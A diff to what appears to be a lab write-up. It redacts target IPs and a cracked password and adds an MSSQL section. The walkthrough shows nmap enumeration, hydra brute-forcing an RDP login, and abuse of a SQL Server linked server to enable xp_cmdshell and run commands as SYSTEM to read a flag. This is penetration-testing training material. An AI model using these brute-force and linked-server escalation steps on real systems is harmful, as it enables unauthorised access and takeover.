@@ -3554,9 +3554,9 @@ The third server is another internal server used to manage files and working mat
 <summary><h3>Enumeration</h3></summary>
 
 ```bash 
-sudo nmap -p- -sC -sV -Pn 10.129.203.10
+sudo nmap -p- -sC -sV -Pn <TARGET_IP>
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-23 21:22 CDT
-Nmap scan report for 10.129.203.10
+Nmap scan report for <TARGET_IP>
 Host is up (0.066s latency).
 Not shown: 65531 filtered tcp ports (no-response)
 PORT     STATE SERVICE       VERSION
@@ -3564,7 +3564,7 @@ PORT     STATE SERVICE       VERSION
 445/tcp  open  microsoft-ds?
 1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
 | ms-sql-ntlm-info: 
-|   10.129.203.10:1433: 
+|   <TARGET_IP>:1433: 
 |     Target_Name: WIN-HARD
 |     NetBIOS_Domain_Name: WIN-HARD
 |     NetBIOS_Computer_Name: WIN-HARD
@@ -3572,7 +3572,7 @@ PORT     STATE SERVICE       VERSION
 |     DNS_Computer_Name: WIN-HARD
 |_    Product_Version: 10.0.17763
 | ms-sql-info: 
-|   10.129.203.10:1433: 
+|   <TARGET_IP>:1433: 
 |     Version: 
 |       name: Microsoft SQL Server 2019 RTM
 |       number: 15.00.2000.00
@@ -3619,7 +3619,7 @@ Nmap done: 1 IP address (1 host up) scanned in 292.33 seconds
 Listing the service
 
 ```bash 
-smbclient -L 10.129.203.10
+smbclient -L <TARGET_IP>
 # Password for [WORKGROUP\htb-ac-1640397]:
 
 # 	Sharename       Type      Comment
@@ -3629,7 +3629,7 @@ smbclient -L 10.129.203.10
 # 	Home            Disk      
 # 	IPC$            IPC       Remote IPC
 # Reconnecting with SMB1 for workgroup listing.
-# do_connect: Connection to 10.129.203.10 failed (Error NT_STATUS_IO_TIMEOUT)
+# do_connect: Connection to <TARGET_IP> failed (Error NT_STATUS_IO_TIMEOUT)
 # Unable to connect with SMB1 -- no workgroup available
 
 smb: \> dir
@@ -3779,7 +3779,7 @@ cat random.txt
 <summary><h3>Brute-force</h3></summary>
 
 ```bash 
-hydra -l fiona -P ./creds.txt 10.129.203.10 rdp
+hydra -l fiona -P ./creds.txt <TARGET_IP> rdp
 ```
 ```bash 
 # Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -3789,19 +3789,87 @@ hydra -l fiona -P ./creds.txt 10.129.203.10 rdp
 # [INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
 # [WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
 # [DATA] max 4 tasks per 1 server, overall 4 tasks, 7 login tries (l:1/p:7), ~2 tries per task
-# [DATA] attacking rdp://10.129.203.10:3389/
-[3389][rdp] host: 10.129.203.10   login: fiona   password: 48Ns72!bns74@S84NNNSl
+# [DATA] attacking rdp://<TARGET_IP>:3389/
+[3389][rdp] host: <TARGET_IP>   login: fiona   password: <PASSWORD>
 # 1 of 1 target successfully completed, 1 valid password found
 # Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-24 21:43:29
 ```
 
 </details>
 
+<details>
+<summary><h3>MSSQL</h3></summary>
 
 ```bash 
-smb: \> quit
+sqsh -S <TARGET_IP> -U '.\\fiona' -P '<PASSWORD>' -h
+```
+```bash 
+sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
+Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
+This is free software with ABSOLUTELY NO WARRANTY
+For more information type '\warranty'
+1> SELECT srvname, isremote FROM sysservers
+2> go
+        WINSRV02\SQLEXPRESS                        
+               1
+
+        LOCAL.TEST.LINKED.SRV                                        
+               0
+
+1> SELECT distinct b.name
+FROM sys.server_permissions a 
+INNER JOIN sys.server_principals b 
+ON a.grantor_principal_id = b.principal_id 
+WHERE a.permission_name = 'IMPERSONATE'
+2> go
+
+        john
+        simon  
+
+1> EXECUTE AS LOGIN = 'john'
+SELECT SYSTEM_USER 
+SELECT IS_SRVROLEMEMBER('sysadmin') 
+2> go
+        john                                                           
+           0
+
+1> SELECT * FROM openquery("LOCAL.TEST.LINKED.SRV", 'SELECT is_srvrolemember(''sysadmin'')')
+2> go
+           1
+
+1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
+2> go
+
+        WINSRV02\SQLEXPRESS      
+
+        Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
+        Sep 24 2019 13:48:23 
+        Copyright (C) 2019 Microsoft Corporation
+        Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
+
+        testadmin                       
+                  1
+
+1> EXECUTE('
+2>  EXEC sp_configure ''show advanced options'', 1;
+3>  RECONFIGURE;
+4>  EXEC sp_configure ''xp_cmdshell'', 1;
+5>  RECONFIGURE;
+6>  EXEC xp_cmdshell ''whoami''
+7> ') AT [LOCAL.TEST.LINKED.SRV];
+8> go
+Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+
+        nt authority\system   
+
+1> EXECUTE('EXEC xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV];
+2> go
+
+        <FLAG>      
 ```
 
+</details>
 
 </details>
 
